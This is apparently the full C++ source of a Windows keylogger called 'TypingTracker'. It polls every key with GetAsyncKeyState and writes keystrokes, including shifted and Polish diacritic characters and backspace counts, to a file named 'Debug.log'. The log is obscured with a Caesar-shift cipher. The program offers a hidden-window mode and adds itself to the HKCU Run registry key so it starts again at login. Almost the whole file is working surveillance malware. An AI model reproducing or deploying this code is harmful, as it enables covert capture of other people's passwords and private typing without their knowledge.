/*******************************************************************/

/* Original File Name: main.cpp                                    */

/* Date: 19-05-2018                                                */

/* Developer: Dionysus Benstein                                    */

/* Copyright © 2018 Dionysus Benstein. All rights reserved.        */

/* Description: The main file that defines the entry point for	   */
/*				the application.

/*******************************************************************/

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>
#include "config.h"

#define VISIBLE_UI //Macros for UI conditional compilation

//using namespace std;

bool is_capslock = false;
int backspace = 0;

std::string encryptLogs(const std::string str, const int key)
{
	std::string high_en_alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	std::string low_en_alph = "abcdefghijklmnopqrstuvwxyz";
	std::string high_ru_alph = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ";
	std::string low_ru_alph = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя";
	std::string signs = "!\"#$%^&*()+=-_'?.,|/`~№:;@[]{}";
	std::string numbers = "0123456789";

	std::string output;

	for (int i = 0; i < str.length(); ++i)
	{
		if (str[i] == ' ')
		{
			output += ' ';
		}

		for (int j = 0; j < high_en_alph.length(); ++j)
		{
			if (high_en_alph[j] == str[i])
			{
				if ((j + key) > 25)
				{
					output += high_en_alph[(j - 26) + key];
				}
				else
				{
					output += high_en_alph[j + key];
				}
			}
		}

		for (int j = 0; j < low_en_alph.length(); ++j)
		{
			if (low_en_alph[j] == str[i])
			{
				if ((j + key) > 25)
				{
					output += low_en_alph[(j - 26) + key];
				}
				else
				{
					output += low_en_alph[j + key];
				}
			}
		}

		for (int j = 0; j < high_ru_alph.length(); ++j)
		{
			if (high_ru_alph[j] == str[i])
			{
				if ((j + key) > 32)
				{
					output += high_ru_alph[(j - 33) + key];
				}
				else
				{
					output += high_ru_alph[j + key];
				}
			}
		}

		for (int j = 0; j < low_ru_alph.length(); ++j)
		{
			if (low_ru_alph[j] == str[i])
			{
				if ((j + key) > 32)
				{
					output += low_ru_alph[(j - 33) + key];
				}
				else
				{
					output += low_ru_alph[j + key];
				}
			}
		}

		for (int j = 0; j < signs.length(); ++j)
		{
			if (signs[j] == str[i])
			{
				if ((j + key) > 29)
				{
					output += signs[(j - 30) + key];
				}
				else
				{
					output += signs[j + key];
				}
			}
		}

		for (int j = 0; j < numbers.length(); ++j)
		{
			if (numbers[j] == str[i])
			{
				if ((j + key) > 9)
				{
					output += numbers[(j - 10) + key];
				}
				else
				{
					output += numbers[j + key];
				}
			}
		}
	}
	return output;
}

int writeLog(const int key)
{
	//Write log
	std::ofstream out_file;
	out_file.open("Debug.log", std::ios_base::app);
	std::string sLogs = "";
	time_t t = time(0);

	switch (key)
	{
	//Numeric keyboard
	case 96:
		::backspace = 0;
		sLogs += "0";
		break;
	case 97:
		::backspace = 0;
		sLogs += "1";
		break;
	case 98:
		::backspace = 0;
		sLogs += "2";
		break;
	case 99:
		::backspace = 0;
		sLogs += "3";
		break;
	case 100:
		::backspace = 0;
		sLogs += "4";
		break;
	case 101:
		::backspace = 0;
		sLogs += "5";
		break;
	case 102:
		::backspace = 0;
		sLogs += "6";
		break;
	case 103:
		::backspace = 0;
		sLogs += "7";
		break;
	case 104:
		::backspace = 0;
		sLogs += "8";
		break;
	case 105:
		::backspace = 0;
		sLogs += "9";
		break;

	//Top keyboard
	case 48:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += ")";
		}
		else
		{
			sLogs += "0";
		}
		break;
	case 49:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "!";
		}
		else
		{
			sLogs += "1";
		}
		break;
	case 50:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "@";
		}
		else
		{
			sLogs += "2";
		}
		break;
	case 51:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "#";
		}
		else
		{
			sLogs += "3";
		}
		break;
	case 52:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "$";
		}
		else
		{
			sLogs += "4";
		}
		break;
	case 53:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "%";
		}
		else
		{
			sLogs += "5";
		}
		break;
	case 54:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "^";
		}
		else
		{
			sLogs += "6";
		}
		break;
	case 55:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "&";
		}
		else
		{
			sLogs += "7";
		}
		break;
	case 56:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "*";
		}
		else
		{
			sLogs += "8";
		}
		break;
	case 57:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "(";
		}
		else
		{
			sLogs += "9";
		}
		break;

	//Inputting a set of letters from the keyboard
	case 65:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#260";
			}
			else
			{
				sLogs += "A";
			}
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#261";
			}
			else
			{
				sLogs += "a";
			}
		}
		break;
	case 66:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "B";
		}
		else
		{
			sLogs += "b";
		}
		break;
	case 67:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#262";
			}
			else
			{
				sLogs += "C";
			}
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#263";
			}
			else
			{
				sLogs += "c";
			}
		}
		break;
	case 68:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "D";
		}
		else
		{
			sLogs += "d";
		}
		break;
	case 69:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#280";
			}
			else
			{
				sLogs += "E";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#281";
			}
			else
			{
				sLogs += "e";
			}
		}
		break;
	case 70:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "F";
		}
		else
		{
			sLogs += "f";
		}
		break;
	case 71:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "G";
		}
		else
		{
			sLogs += "g";
		}
		break;
	case 72:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "H";
		}
		else
		{
			sLogs += "h";
		}
		break;
	case 73:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "I";
		}
		else
		{
			sLogs += "i";
		}
		break;
	case 74:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "J";
		}
		else
		{
			sLogs += "j";
		}
		break;
	case 75:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "K";
		}
		else
		{
			sLogs += "k";
		}
		break;
	case 76:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#321";
			}
			else
			{
				sLogs += "L";
			}
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&322";
			}
			else
			{
				sLogs += "l";
			}
		}
		break;
	case 77:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "M";
		}
		else
		{
			sLogs += "m";
		}
		break;
	case 78:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#323";
			}
			else
			{
				sLogs += "N";
			}
			break;
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#324";
			}
			else
			{
				sLogs += "n";
			}
		}
		break;
	case 79:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#211";
			}
			else
			{
				sLogs += "O";
			}
			break;
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#243";
			}
			else
			{
				sLogs += "o";
			}
		}
		break;
	case 80:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "P";
			break;
		}
		else
		{
			sLogs += "p";
		}
		break;
	case 81:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "Q";
			break;
		}
		else
		{
			sLogs += "q";
		}
		break;
	case 82:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "R";
			break;
		}
		else
		{
			sLogs += "r";
		}
		break;
	case 83:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#346";
			}
			else
			{
				sLogs += "S";
			}
			break;
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#347";
			}
			else
			{
				sLogs += "s";
			}
		}
		break;
	case 84:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "T";
			break;
		}
		else
		{
			sLogs += "t";
		}
		break;
	case 85:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "U";
			break;
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "ˆ";
			}
			else
			{
				sLogs += "u";
			}
		}
		break;
	case 86:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "V";
			break;
		}
		else
		{
			sLogs += "v";
		}
		break;
	case 87:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "W";
			break;
		}
		else
		{
			sLogs += "w";
		}
		break;
	case 88:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#377";
			}
			else
			{
				sLogs += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#378";
			}
			else
			{
				sLogs += "x";
			}
		}
		break;
	case 89:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			sLogs += "Y";
			break;
		}
		else
		{
			sLogs += "y";
		}
		break;
	case 90:
		::backspace = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#379";
			}
			else
			{
				sLogs += "Z";
			}
			break;
		}
		else
		{
			if (GetAsyncKeyState(VK_MENU))
			{
				sLogs += "&#380";
			}
			else
			{
				sLogs += "z";
			}
		}
	//Decimal key codes
	case 13:
		::backspace = 0;
		sLogs += "\n";
		break;
	case 20:
		::backspace = 0;
		if (::is_capslock == false)
		{
			::is_capslock = true;
			sLogs += " [CapsLock] ";
		}
		else
		{
			::is_capslock = false;
			sLogs += " [/CapsLock] ";
		}
		break;
	case VK_BACK:
		::backspace += 1;
		sLogs += " [";
		sLogs += ::backspace + '0';
		sLogs += "x";
		sLogs += "Backspace]";
		break;
	case VK_SPACE:
		::backspace = 0;
		sLogs += " ";
		break;
	case VK_MULTIPLY:
		::backspace = 0;
		sLogs += "*";
		break;
	case VK_ADD:
		::backspace = 0;
		sLogs += "+";
		break;
	case VK_SUBTRACT:
		::backspace = 0;
		sLogs += "-";
		break;
	case VK_DECIMAL:
		::backspace = 0;
		sLogs += ".";
		break;
	case VK_DIVIDE:
		::backspace = 0;
		sLogs += "/";
		break;
	case VK_CONTROL:
		::backspace = 0;
		sLogs += " [CONTROL]";
		break;
	}

	#ifdef VISIBLE_UI
	std::cout << sLogs;
	#endif //VISIBLE_UI

	out_file << encryptLogs(sLogs, 5);
	out_file.close();

	return 0;
}

void displayMode(const u_short display_mode)
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, display_mode);
}

void addInAutorun()
{
	HKEY hKey;
	char szPath[0x100];
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
		nullptr, &hKey, nullptr);

	if (hKey)
	{
		RegSetValueEx(hKey, "", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
		RegCloseKey(hKey);
	}
}

int main(int argc, char *argv[])
{
	#ifndef VISIBLE_UI
	displayMode(0); //1 - visible window, 0 - hidden window
	#endif //VISIBLE_UI

	#ifdef VISIBLE_UI
	//UI for interactions with application display mode
	std::cout << "TypingTracker " << PROJECT_VERSION_MAJOR << ".";
				        std::cout << PROJECT_VERSION_MINOR << ".";
						std::cout << PROJECT_VERSION_PATCH << std::endl;
					    std::cout << PROJECT_COPYRIGHT << "\n" << std::endl;

	unsigned short int display_mode;
	std::cout << "Display mode 1 - visible window, 0 - hidden window" << std::endl;
	std::cout << "Select display mode and press Enter: ";
	std::cin >> display_mode;

	if (display_mode == 1 || display_mode == 0)
	{
		displayMode(display_mode);
	}
	else
	{
		std::cout << "\nERROR!\a\nInvalid display mode value." << std::endl;
		std::cout << "Try selected display mode again.\n" << std::endl;
		exit(0);
	}
	#endif //VISIBLE_UI

	addInAutorun();

	char buffer[MAX_PATH];
	::GetModuleFileNameA(NULL, buffer, MAX_PATH);

	char i;
	while (true)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				writeLog(i);
			}
		}
	}

	return 0;
}